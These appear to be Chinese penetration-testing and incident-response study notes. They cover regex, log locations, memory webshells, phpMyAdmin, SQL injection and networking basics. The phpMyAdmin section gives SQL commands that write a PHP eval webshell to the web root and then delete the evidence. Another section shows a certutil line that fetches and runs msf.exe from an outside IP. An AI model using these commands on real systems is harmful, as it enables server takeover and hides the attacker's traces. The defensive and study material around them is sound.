![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps38.jpg)

# 正则表达式

### 渗透测试常用的正则

php中使用正则的两个函数

preg_match_all(正则表达式,匹配字符串)

返回匹配到的次数

preg_replace (正则表达式,替换成什么,匹配字符串)

返回替换后的结果

常用转义字符：

数字：\d

非数字：\D

空白字符(空格、制表符、换页符)：\s

非空白字符：\S

单词字符(26个英文字母+数字+下划线):\w

非单词字符:\W

自定义字符集合

字符集合：[单个字符或字符区间]，用于匹配集合内字符

如：

[a-z] 表示a-z这26个英文字母

[0-9a-z]表示 表示0-9这十个数字和a-z这26个英文字母

[135a-h] 表示1,3,5还有a-h这8个英文字母

注意：两个不同字符段间请勿使用,隔开。

非集：[^单个字符或字符区间]，用于匹配非集合内字符。

如：

[^0-9]表示匹配所有非数字字符

[^a-zA-Z]表示匹配所有非字母集合

正则表达式的关键字

() => 和数学一样很像，代表这是一个整体。

^ => 匹配输入字符串的开始位置

$ => 匹配输入字符串的结尾位置

. => 通配符[代表任意字符][不匹配换行]

\* => 匹配0次或者多次

=> 匹配1次或者多次

\ => 转义字符

| => 两项之间的一个选择。

限定符

{n} => 例如: 0{8} 意思是指 只有连起来8个0才会被匹配

{n,} =>例如： 0{2,} 意思是 只要有2个0及其以上的就会被匹配

{n,m} => 例如： 0{2,4} 意思是最少匹配2个0，最多匹配4个0

注：被匹配时，默认匹配最多的次数

修饰符

/i => 不区分大小写

/A => 匹配规则必须从头开始匹配

/s => 将匹配一切字符

/x => 正则表达式中的空白字符会被忽略

# 日志文件

### Windows系统日志查看

Windows+R 输入eventvwr.msc 打开（事件查看器）

所有审计日志清除审计：4612

所有用户登录事件：4624

所有用户登录失败事件：4625

会话重新连接或断开：4778 4779

当一个域用户帐号在域控制器认证时，生成用户帐号成功登录事件：4768, 4776

Windows系统的日志文件存放在C:/windows/system32/winevt/logs目录下

Windows系统的日志分为三种

\1. 系统日志:    System.evtx    (系统组件等日志)

\2. 应用程序日志: Application.evtx (应用程序等日志)

\3. 安全日志:    Security.evtx    (系统登录等日志)

### Linux系统日志

\1. tail命令，用于查看前多少行日志；2、head命令，用于查看后多少行日志；3、cat命令，可用于查询关键字的日志。

\1. Linux： 日志默认存放位置：/var/log/ 查看日志配置情况：more /etc/rsyslog.conf

### Windows在应急响应中的安全日志以及对应场景

· Windows和Linux的日志文件放在哪里

· Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志

系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx

· Linux

日志默认存放位置：/var/log/查看日志配置情况：more /etc/rsyslog.conf

· 常见中间件的配置文件路径

· apache：/etc/httpd/conf

· nginx：/etc/nginx

· iis7：C:\Windows\System32\inetsrv\config\

### 日志文件分析-日志文件里面有什么？

1、日志记录格式通常为，访问的ip地址，时间，访问路径，服务器响应状态，返回[数据](https://www.77169.net/hacker)大小。

2、一般的web server有两部分日志：

一是运行中的日志，它主要记录运行的一些信息，尤其是一些异常错误日志信息  二是访问日志信息，它记录的访问的时间，IP，访问的资料等相关信息。

\1. 分析中间件日志的原因：

中间件日志记录Web服务器接受处理请求及运行时错误等各种原始信息

通过对日志进行统计、分析和综合，就能有效地掌握服务器的运行状况、发现和排除错误原因、了解客户访问分布等，更好地加强系统的维护和管理

访问日志的主要记录内容：

访问服务器的远程机器的IP地址：可以得知浏览者来自何方

浏览者访问的资源：可以得知网站中哪些部分最受欢迎

浏览器的浏览时间：可以从浏览时间（如工作时间或休闲时间）对网站内容进行调整

浏览者使用的浏览器：可以根据大多数浏览者使用的浏览器对站点进行优化

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps39.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps40.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps41.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps42.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps43.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps44.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps45.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps46.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps47.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps48.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps49.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps50.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps51.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps52.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps53.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps54.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps55.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps56.jpg)

# 内存马问题

### 1、内存马了解吗，如何查杀？

答：内存马的原理就是在 web 组件或者应用程序中，注册一层访问路由，访问者通 过这层路由，来执行我们控制器中的代码。 通过 Filter 和 Controller 等在请求过程中在内存中修改或动态注册新的组件，达到注入 Webshell 的目的。

一般通过使用工具 Arthas 发现内存马，再使用 D 盾或河马查找。

排查处置

1、进行关机重启可清除内存马

2、java-memshell-scanner

http//github.c/c0n/java-memshell-scanner

下载内存马检测工具 放置在根目录下把对应的进行kill掉

### 2、Java 内存马排查

通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。

· 如果是jsp注入，日志中排查可疑jsp的访问请求。

· 如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法

· 根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。

· 如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。

· 如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200

# Phpmyadmin

### 如何查看phpmyadmin版本

直接在phpmyadmin的url后加下面文件路径爆出：

/readme

/changelog

/Change

/changelog.php

/Documetation.html

/Documetation.txt

/translators.html

/doc/html/index.html

### Getshell方法

通过写入getshell

1、查询是否有写入条件：

show VARIABLES like '%secure_file_priv%' == null 则没有条件，换成日志写入 （secure_file_priv值可在mysql中的my.ini中修改）

show global variables like "secure%" 也可以查询

2、当具备条件时，写入一句话文件：

select '<?php eval($_POST["pwd"]); ?>' into outfile 'D:/phpStudy_pro/WWW/shell.php';

3、其他信息收集查询命令：

show variables like '%char%' === 查看系统变量

select @@datadir ==== 系统路径

set PASSWORD=PASSWORD("") ========改登入密码（危害大）

利用日志getshell

1、条件：

set global general_log = 'on' 日志保存状态

set global general_log_file = "" 日志保存路径

2、写入shell：

select '<?php eval($_POST[pwd]); ?>';

3）新建表getshell

1、进入一个数据库，新建数据表。

命令：Create TABLE shell_table (xxx text NOT NULL)

2、添加字段

字段名任意，xxx

字段类型为TEXT

3、在该表中点击插入，值为一句话木马

<div>
<?php eval($_POST[pwd]); ?>'
</div>

命令：Insert INTO shell_table (xxx) VALUES('<?php eval($_POST[1]);?>');

4、执行SQL查询，将该表中的内容导出到指定文件

select * from shell_table into outfile "D:/phpstudy_pro/WWW/shell.php";

5、删除该表，抹除痕迹

Drop TABLE IF EXISTS shell_table;

### phpMyadmin的防护

​![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps57.jpg)​

# 爆路径方法

### 如何获取目标站点的绝对路径

1.如果是IIS系统，尝试对参数进行恶意传值，使其出现报错页面

2.如果目标是 TinkPHP框架，尝试访问无效的路径，或对参数进行恶意传值使其报错，出现TP特有的报错页面

3.使用字典猜解目标站点的绝对路径（实战中还是较为有效）

4.对目标站点进行JS代码审计，查看是否存在信息泄露出站点的绝对路径

5.phpinfo页面泄露站点绝对路径

### php爆绝对路径方法？

单引号引起数据库报错

访问错误参数或错误路径

探针类文件如phpinfo

扫描开发未删除的测试文件

google hacking

phpmyadmin报路径：/phpmyadmin/libraries/lect_lang.lib.php

利用漏洞读取配置文件找路径

恶意使用网站功能，如本地图片读取功能读取不存在图片，上传点上传不能正常导入的文件

# 应急响应和溯源

### windows应急响应时排查分析的相关细节？

可疑账号排查 lusrmgr.msc

1.检查服务器是否有弱口令。比如空口令或者密码复杂度不够。

2.高危端口是否对外开放，比如SSH服务22端口，RDP服务3389端口等。

3.查看服务器是否有可疑账号。

手工方面：lusrmgr.msc命令查看用户和组，查看是否有新增账号，隐藏账号，克隆账号。

工具方面：比如利用D盾等工具来检测隐藏账号。

4.结合日志分析 eventvwr.msc 查看管理员登录时间，相关事件是否有异常。

敏感事件ID：

4624 登录成功

4625 登录失败

4672 使用超级管理员进行登录

4720 创建用户

5.使用query user查看当前系统的会话，比如查看是否有人使用远程登录服务器。

可疑进程和服务排查 taskmgr services.msc

1.查看CPU，内存，网络等资源是否有可疑状况。比如CPU占用率过高可能是中了挖矿病毒，磁盘空间大量占用可能是脚本或病毒大量生成和复制隐藏文件。

2.检查进程名

某些进程名是大量随机的情况，比如hrlC3.tmp、hrlD5.tmp、hrl6.tmp、hrlEE.tmp等多个名字相似的进程，基本上可以断定是异常进程。

异常进程名伪装成系统进程或者说常见服务的进程名，此时可以通过进程描述来判断，并且需要手工对比。

3.检查进程和服务描述，修改时间或者数字签名是否有异常。

4.利用工具进行检测，比如Process Hunter或者火绒剑等专门针对进程服务信息的排查分析工具，主要查看的是公司名，描述，安全状态和启动类型等方面来排查。

可疑启动项排查 msconfig

\1. msconfig或者任务管理器中的启动项查看名称，发布者和启动影响，以及右键查看属性来看数字签名和修改时间。

\2. 结合工具进行排查，比如火绒剑等工具，会将启动项分类为登录，驱动程序，计划任务，映像劫持等，利用分析排查

可疑文件排查

1.各个磁盘的Temp/tmp目录中是Windows产生的临时文件，查看有无异常文件。

2.Recent目录会记录最近打开的文档以及程序的相关记录。

3.查看文件的创建时间，修改时间和访问时间，比如说攻击者利用菜刀等工具对文件进行修改会改变修改时间，如果修改时间在创建时间之前，那就是很明显的可疑文件。

4.windows系统我的电脑快速访问，可以看到最近使用的文件，比如说图片或者压缩包等文件的使用历史和文件路径都会显示。

恶意样本排查

1.恶意样本指的一般是webshell、病毒、木马或者后门程序或文件，可以根据设备的告警信息来查找相关路径，再排查相关的进程和启动项。

2.不知道路径的话可以利用相关的安全设备来进行检测，比如说通过D盾，河马查杀等工具对webshell可能存在的目录进行一个排查查杀，利用常规的防火墙软件来对全盘或者可疑目录扫描病毒。

### 网络安全事件应急响应

断网：条件允许时优先断网，防止黑客进一步操作或删除痕迹

取证：通过分析登录日志、网站日志、服务日志寻找黑客ip，查看黑客进行的操作

备份：备份服务器文件，对比入侵前后产生变化的文件

查漏：通过上述步骤寻找业务薄弱点，修补漏洞

杀毒：清除黑客留下的后门、webshell、管理账号

溯源：通过黑客ip地址，入侵手段等

记录：归档、预防

### 应急响应流程及windows/linux用到的命令

应急响应流程：

1、收集信息：搜集客户信息和中毒信息，备份

2、判断类型：判断是否是安全事件、是何种安全事件（勒索病毒、挖矿、断网、ddos等）

3、深入分析：日志分析、进程分析、启动项分析、样本分析

4、清理处置：杀掉恶意进程、删除恶意文件、打补丁、修复文件

5、产出报告：整理并输出完整的安全事件报告

windows应急

一、查看系统账号安全

1、查看服务器是否有弱口令、可疑账号、隐藏账号、克隆账号、远程管理端口是否对公网开放

2、win+r（eventwmr.msc）查看系统日志，查看管理员登录时间、用户名是否存在异常

二、检查异常端口、进程

1、netstat -ano 检查端口连接情况，是否有远程连接、可疑连接

2、tasklist | findstr "PID"根据pid定位进程

3、使用功能查杀工具

三、启动项检查、计划任务、服务

1、检查服务器是否有异常的启动项，msconfig看一下启动项是否有可以的启动

2、检查计划任务，查看计划任务属性，可以发现木马文件的路径

3、见擦汗服务自启动，services.msc注意服务状态和启动类型，检查是否有异常服务

四、检查系统相关信息

1、查看系统版本以及补丁信息 systeminfo

2、查找可以目录及文件 是否有新建用户目录 分析最近打开分析可疑文件（%UserProfile%\Recent）

五、自动化查杀

使用360 火绒剑 webshell后门可以使用d盾 河马等

六、日志分析

360星图日志分析工具 ELK分析平台

linux应急

1、检查用户及密码文件/etc/passwd、/etc/shadow 是否存在多余帐号，主要看一下帐号后面是否是 nologin,如果没有 nologin 就要注意；

⑴查看具有远程登录权限的用户：cat /etc/shadow |egrep ‘$1|$6’|awk -F: ‘{print $1}’

⑵查看文件最近修改时间：ls –l /etc/shadow

(3)账户配置文件/etc/login.defs

(4) sudo权限配置文件/etc/sudoers

2、通过 who 命令查看当前登录用户（tty 本地登陆 pts 远程登录）、w 命令查看系统信息，想知道某一时刻用户的行为、uptime查看登陆多久、多少用户，负载；

3、修改/etc/profile的文件，在尾部添加相应显示间、日期、ip、命令脚本代码，这样输入history命令就会详细显示攻击者 ip、时间历史命令等；

4、用 netstat -antlp|more命令分析可疑端口、IP、PID，查看下 pid 所对应的进程文件路径，运行ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的pid 号）；

5、使用ps命令，分析进程 ps aux | grep pid

6、使用 vi /etc/inittab 查看系统当前运行级别，通过运行级别找到/etc/rc.d/rc[0~6].d对应目录是否存在可疑文件；

7、看一下crontab定时任务是否存在可疑启用脚本；

8、使用chkconfig --list 查看是否存在可疑服务；

9、通过grep awk命令分析/var/log/secure安全日志里面是否存在攻击痕迹；

10、chkrootkit、rkhunter、Clamav 病毒后门查杀工具对 Linux 系统文件查杀；

11、如果有 Web 站点，可通过 D 盾、河马查杀工具进行查杀或者手工对代码按脚本木马关键字、关键涵数（evel、system、shell_exec、exec、passthru system、popen）进行查杀Webshell 后门。

### 应急响应流程

一般客户给予反馈后，看有什么特征，根据样本特征提前准备好应急所需工具 比如应急响应信息采集器。

到用户现场，首先让客户备份数据，在不影响业务情况下进行隔离服务器，然后根据特征去服务器排查

先是看服务器端口、进程、服务，包括web代码（用d盾）进行扫描一下，看看有没有一句话木马或者其他的大马，还有启动项、注册表，计划任务这些地方进行排查，有问题的话 进行手工查杀，如果是内核级别或者驱动级别的木马，挂载(隐藏)在进程里面，就用PCHunter、火绒剑，

找到挂载的地方，对数组子进程，进行查杀掉

最后分析漏洞，看看对方是怎么进来的，一般我看的是中间件日志，系统日志，根据木马上传时间，看数据库日志，再到安全设备，就是态势感知设备，看前后时间段有没有问题，看恶意代码是怎么进来的，

是注入啊、文件上传啊，还是其他什么的，根据这些进行溯源，看源ip或者是攻击ip是不是设置了vpn，如果没有的话，直接探测这个ip的二级域名，

看看有没有开放什么端口，用扫描器直接扫一下，看看有没有其他的服务，直接反入侵，或者根据这个ip去一些在线的平台，（微步在线、奇安信）威胁情报分析里面去分析一下，

看看这个ip是不是专门搞攻击的，是一个正常的ip还是一个非法的ip，一般就是这么排查的，如果数据包里有ID号的话，有社工库，查询一下，

或者各个网站里边搜索一下，是不是注册过一些信息，找一下用户信息。

然后就是输出应急报告、事后再进行观察

最后提供一些建议给客户，比如一些安全加固措施、推荐一些切合的安全产品。一般我就是这么做的

### 应急响应流程（总结）

先通过监控安全设备IDS、态势感知备份的流量进行排查

如果对方通过手工绕过IDS、态势感知再进行系统层面的排查

查有没有隐藏账号、其次查网络连接、端口号，查进程，查服务、查启动项、还可以查操作系统日志找这些地方，可能找到入侵的痕迹。

Web站点排查根据别人上传木马上传时间排序进行排查，D盾、盒马工具查杀，常见的一些挂马的代码，通过xsearch搜索特征码，其次通过中间件日志来排查

### 主机疑似遭到入侵，要看哪里的日志

系统登录日志

服务访问日志

网站日志

数据库日志

### 给你一个比较大的日志，应该如何分析？

攻击规则匹配通过正则匹配日志中的攻击请求

统计方法，统计请求出现次数，次数少于同类请求平均次数则为异常请求

白名单模式，为正常请求建立白名单，不在名单范围内则为异常请求

HMM 模型，类似于白名单，不同点在于可对正常请求自动化建立模型，从而通过正常模型找出不匹配者则为异常请求

使用日志分析工具，如LogForensics，Graylog，Nagios，ELK Stack等等

### 说一下你的溯源过程

一般由监控组发现攻击包，可以从数据包中看到带有攻击特征码的数据包，有返回结果的回包可以判断是否成功，如果确认成功，就说明该参数有漏洞，首先需要通过监控设备、中间件日志、系统日志定位该 IP 地址，要知道攻击是怎样进来的，去服务器排查攻击达到了哪个层面，有 web 层面，系统层面，数据库层面， 应用软件层面，首先排查系统层面有没有弱口令，可疑账号，克隆账号，远程管理 端口是否对公网开放， web 一般是参数未过滤，看攻击者是否在内网提权进行横向的内网渗透，可以用一些 360 星图工具排查日志， D 盾安全狗扫一下 web 代码里有没有脚本后门代码，也可以根据流量监控设备查查攻击者日志及 payload 代码，找到之后通过 bp 还原攻击；最后修复漏洞，可以将被攻击的web页面暂时下线，可以先加相关函数过滤，之后根据查到的攻击源IP和各种信息收集的信息进行社工等

# 协议

### http和https有什么区别？

https端口是443、http的端口是80

http传输的是明文的，https是用ssl进行加密 https的安全性更高

https是需要申请证书的，需要一定的费用，而http不需要

http HTTPS

HTTP 应用层 HTTP 应用层

TCP 传输层 TSL or SSL 安全层

IP 网络层 TCP 传输层

网络接口 数据链路层 IP 网络层

网络接口 数据链路层

### Ping用的什么协议

ICMP协议

### TCP三次握手过程，四次挥手过程？

第一次握手：建立连接时,客户端发送syn包(syn=j)到服务器,并进入SYN_SEND状态,等待服务器确认

第二次握手：服务器收到syn包,必须确认客户的SYN（ack=j+1）,同时自己也发送一个SYN包（syn=k）,即SYN+ACK包,此时服务器进入SYN_RECV状态

第三次握手：客户端收到服务器的SYN＋ACK包,向服务器发送确认包ACK(ack=k+1),此包发送完毕,客户端和服务器进入ESTABLISHED状态,完成三次握手

三次握手过程

三次握手的目的在于,确认双方的通信能力是否正常

第一次握手,客户端发送连接请求的报文给服务端

第二次握手,服务端接收请求后回复一个ACK报文,并为连接分配资源

第三次握手,客户端收到ACK报文后,也向服务端发送ACK报文,并分配资源,至此,链接建立完成

四次挥手过程

四次挥手的目的在于,终止数据传输并回收资源,必须等待双方都没有数据传输时才能断开连接

第一次挥手,客户端向服务端发送报文,请求关闭数据传送,并进入等待状态

第二次挥手,服务端收到报文后,发送ACK确认,此时客户端到服务端的链接断开

第三次挥手,服务端数据传输完毕后,向客户端发送报文,请求关闭数据,并进入等待状态

第四次挥手,客户端收到报文后,发送确认报文,链接完全断开

### TCP报文头

（1）序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。

（2）确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。

（3）标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：

ACK：确认序号有效。

FIN：释放一个连接。

PSH：接收方应该尽快将这个报文交给应用层。

RST：重置连接。SYN：发起一个新连接。

URG：紧急指针（urgent pointer）有效。需要注意的是：不要将确认序号ack与标志位中的ACK搞混了。确认方ack=发起方seq+1，两端配对。

### 为什么TCP连接的时候是3次？2次不可以吗？

因为需要考虑连接时丢包的问题，如果只握手2次，第二次握手时如果服务端发给客户端的确认报文段丢失，此时服务端已经准备好了收发数(可以理解服务端已经连接成功)据，而客户端一直没收到服务端的确认报文，所以客户端就不知道服务端是否已经准备好了(可以理解为客户端未连接成功)，这种情况下客户端不会给服务端发数据，也会忽略服务端发过来的数据。如果是三次握手，即便发生丢包也不会有问题，比如如果第三次握手客户端发的确认ack报文丢失，服务端在一段时间内没有收到确认ack报文的话就会重新进行第二次握手，也就是服务端会重发SYN报文段，客户端收到重发的报文段后会再次给服务端发送确认ack报文。

### 为什么TCP连接的时候是3次，关闭的时候却是4次？

因为只有在客户端和服务端都没有数据要发送的时候才能断开TCP。而客户端发出FIN报文时只能保证客户端没有数据发了，服务端还有没有数据发客户端是不知道的。而服务端收到客户端的FIN报文后只能先回复客户端一个确认报文来告诉客户端我服务端已经收到你的FIN报文了，但我服务端还有一些数据没发完，等这些数据发完了服务端才能给客户端发FIN报文(所以不能一次性将确认报文和FIN报文发给客户端，就是这里多出来了一次)。

### 为什么客户端发出第四次挥手的确认报文后要等2MSL的时间才能释放TCP连接？

这里同样是要考虑丢包的问题，如果第四次挥手的报文丢失，服务端没收到确认ack报文就会重发第三次挥手的报文，这样报文一去一回最长时间就是2MSL，所以需要等这么长时间来确认服务端确实已经收到了。

### TCP和UDP区别

TCP 协议和 		UDP 协议特性区别总结：

1.TCP 协议在传送数据段的时候要给段标号；	UDP 协议不

2.TCP 协议可靠；	UDP 协议不可靠

3.TCP 协议是面向连接；		UDP 协议采用无连接

4.TCP 协议负载较高，采用虚电路；		UDP 采用无连接

5.TCP 协议的发送方要确认接收方是否收到数据段（3 次握手协议）

6.TCP 协议采用窗口技术和流控

### 七层模型？

[应用层、表示层、会话层、传输层、网络层、数据链路层、物理层]()

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps58.jpg)

![img](file:///C:\Users\Tralong\AppData\Local\Temp\ksohtml16720\wps59.png)

### DNS DNS原理/解析过程

DNS协议属于[应用层](https://so.csdn.net/so/search?q=应用层&spm=1001.2101.3001.7020) , 使用UDP协议传输( 服务器之间的备份使用TCP ) , 作用在于 将域名映射为IP地址

第一步,浏览器缓存

当用户在浏览器输入 www.baidu.com时 , 浏览器会先检查自己的缓存,如果有这个域名,就与其映射的IP地址建立链接,解析完成!

在地址栏输入 chrome://net-internals/#dns , 可以查看谷歌浏览器的DNS缓存

第二步,本地系统缓存

如果浏览器缓存没找到,就检查本地操作系统的缓存,如果有这个域名,就与其映射的IP地址建立链接,解析完成!

Windows系统的DNS缓存保存在 C:\Windows\System32\drivers\etc\hosts 文件中

第三步,本地域名服务器

如果操作系统缓存中没有找到,则检查本地域名服务器的缓存,如果有这个域名,就与其映射的IP建立链接,解析完成!

本地域名服务器为 IPv4协议中配置的首选DNS服务器

第四步,根域名服务器

如果本地域名服务器缓存中没有找到,则请求根服务器,根服务器会返回一个负责该区域的主服务器的IP

根服务器用来管理互联网的主目录,不存储域名,而是存储负责每个域的解析的域名服务器的地址信息,互联网上所有将域名转化为IP地址的请求,理论上都要经过根服务器

第五步,递归请求主域名服务器

本地域名服务器根据根域名服务器返回的IP地址,链接这个主域名服务器,主域名服务器如果有这个域名,就与其映射的IP建立链接,解析完成!

如果没有这个域名,则递归请求下一级域名服务器,直到找到对应的域名

第六步,缓存并建立链接

主域名服务器将查询到的IP地址返回给本地域名服务器,本地域名服务器缓存域名及其映射的IP , 并通过IP地址与web服务器建立链接,展示网站内容

### 路由器/交换机工作原理(RIP/OSPF协议工作原理)

交换机工作原理

交换机负责局域网内主机之间的数据转发

交换机内部有一个MAC地址表,记录了MAC地址与交换机端口的对应信息,当数据需要转发时主机将数据包发送给交换机,交换机将数据包中的源地址映射到端口,并缓存到MAC地址表中,而后根据数据包中的目标地址去MAC地址表中匹配

匹配成功,则会通过单播将数据从端口转发到对应的MAC地址

匹配不成功,则会在局域网内进行广播,目标地址收到广播后会响应交换机,交换机将目标地址映射到对应的端口,并缓存到MAC地址表中,然后转发数据

MAC地址表有一个老化机制,一定时间内没有通信的MAC地址和端口会被遗忘,从而提升效率,这个老化的时间默认是300秒

一层/二层/三层交换机

交换机分为一层,二层,和三层交换机

一层交换机工作在物理层,主要负责局域网内的数据转发

二层交换机工作在数据链路层,可以划分VLAN,从而区分广播域,在数据转发的时候多了一个判断VLAN的步骤,同一VLAN内可以互相通信

三层交换机工作在网络层,提供路由功能,但不能完全取代路由器,因为基础原理不同

路由器工作原理

路由器是一种具有多个输入端口和输出端口的计算机,工作在网络层,负责跨域传输数据,每个路由器都有一个路由表和转发表

路由表用来保存路由信息(比如源地址,目标地址,跳数,下一跳)

转发表是基于路由生成的,用来保存IP地址,子网以及映射的端口

路由器提供了两种重要的机制:路由和转发

路由可以根据数据包的目标地址选择一条最优的路由路径

转发负责将数据包传输到路由器的输出端

RIP/OSPF协议

路由器之间的数据传输需要遵循内部网关协议(IGP),IGP协议包括RIP协议和OSPF协议

RIP协议利用距离矢量算法来判断最优路径,它将到达目的地所需要经过的路由器的个数称为跳数,跳数越大,开销也就越大,当跳数大于或等于16时,将会判定为不可达,这也就意味着RIP协议只能应用在小型网络

OSPF协议根据链路状态来判断最优路径,链路状态是指路由器和那些路由器相邻,OSPF通过输出端口向所有相邻的路由器进行广播,获取相邻路由器的链路状态,而每一个相邻的路由器又再次向所有相邻的路由器进行广播,最终区域内的所有路由器都能建立一个链路状态数据库,也就是全网拓扑图;这种向全网发送广播的方法叫做洪泛法,只有当链路状态发生变化时,路由器才会使用洪泛法进行广播;

# owasp 漏洞都有哪些？

```
1、SQL 注入 
2、失效的身份认证和会话管理 
3、跨站脚本攻击 XSS 
4、直接引用不安全的对象 
5、安全配置错误 
6、敏感信息泄露 
7、缺少功能级的访问控制 
8、跨站请求伪造 CSRF 
9、使用含有已知漏洞的组件 
10、未验证的重定向和转发
```

# SQL注入问题

### 站库分离

从 web 入口渗透

从 web 入口通常就是通过网站的各种漏洞来 getshell，比如文件上传、命令执行、代码执行、还有 SQL 注入写入一句话（into outfile、日志备份等）。

在获得 web 权限或者有诸如文件读取等漏洞时，我们还读数据库配置文件、对数据库内容分析、查找数据库备份，进而对数据库目标 ip 进行渗透，以便后续操作。

二、从数据库入口渗透

站点是站库分离的，数据库和 web 不在同一台服务器上，这时候不能写入一句话木马通过 web 去连，因为路径没有用。如果是从 web 端找到的 SQL 注入，那么可以通过以下这些方式去做信息收集、获取权限。

#### 1.下载远程文件

目标主机允许通外网时我们可以利用Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell等方式来下载远程文件到可读写目录中，然后再去执行一下即可

certutil -urlcache -split -f http://155..*.229:8888/msf.exe C:ProgramDatamsf.exe

C:ProgramDatamsf.exe

#### 2.执行远程Payload

目标主机允许通外网时我们可以直接利用Metasploit下的exploit/multi/script/web_delivery和exploit/windows/misc/hta_server两个模块来执行远程Payload获取会话，

#### 3.模拟令牌权限提升

笔者曾经在几个这样的"MSSQL站库分离”实战环境中直接通过Incognito扩展中的模拟令牌功能获取到数据库服务器的Admin/SYSTEM令牌

在本地"站库分离”靶场环境中测试发现，只要有主机在使用Windows身份验证连接到这台数据库服务器的MSSQL时就会保留当前登录用户的令牌，而大多数人又都是以默认Administrator管理员来安装的MSSQL，所以能够直接获取到Administrator令牌

支持Windows身份验证的数据库连接工具有：sqlcmd、SSMS和Navicat Premium等

### 1、SQL注入的原理

产生sql注入漏洞主要因为没有对接受到的参数进行过滤、验证和处理直接拼接到了sql语句中，然后直接执行该sql语句，这样就会导致恶意用户传入一些精心构造的sql代码，与后台sql语句拼接后形成完整的sql语句执行，达到攻击者的目的。接受相关参数未经处理直接带入数据库查询操作

### 2、SQL注入到底能做什么？

SQL注入可以爆得数据库的一些数据信息

严重的SQL注入还可以getshell

篡改数据库的数据——通过获得权限后的增删改查

挂黑页

### 3、SQL注入的种类？

提交方式：get、post、cookie注入

注入参数类型分：字符型、数字型、搜索型

从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、宽字节注入

### 3.1 SQL注入防御方法

```
使用安全的API

使用正则表达式提交字符串过滤、采用前端加服务端过滤

安全函数，对敏感字符进行转义

不显示数据库错误

预编译

强迫使用参数化语句

最小权限，只给访问数据库的WEB应用最小权限

重要信息加密储存

使用安全防护产品

拒绝风险ip，比如短时间大量访问
```

### 3.2 登录框搜索页面如何判定有没有注入漏洞

```
%‘ and 1=1 --’ 
```

### 3.3 SQL注入加固

（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。

（2）对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。

（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。

（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。

（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。

（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。

（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。

（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。

### 4、介绍下你的SQL注入流程

判断是否有回显，有回显尝试联合查询，无回显查看是否有数据库报错信息，有报错信息可以尝试报错注入。无回显无报错信息，尝试盲注（时间和布尔）

### 5、如何判断sql注入，有哪些方法

提交错误语句是否有异常，除此之外这些显示的错误可以通过sleep，修改语句执行5秒等，除此之外通过DNSlog判断是否有传回值

### 6、盲注的原理

SQL注入中，在不能通过回显的情况下来判断是否存在SQL注入或获取数据库中信息，可以通过页面返回的不同信息来判断注入的一种方式。

盲注分为布尔盲注（页面是否显示正常数据）、时间盲注（回显页面的时间）

### 盲注是什么？怎么进行盲注？

1、盲注是在进行SQL注入时，页面没有将SQL语句的执行结果在页面展示（回显），只能单纯的通过服务器返回的内容变化、响应时间来判断是否存在SQL注入和利用方式。

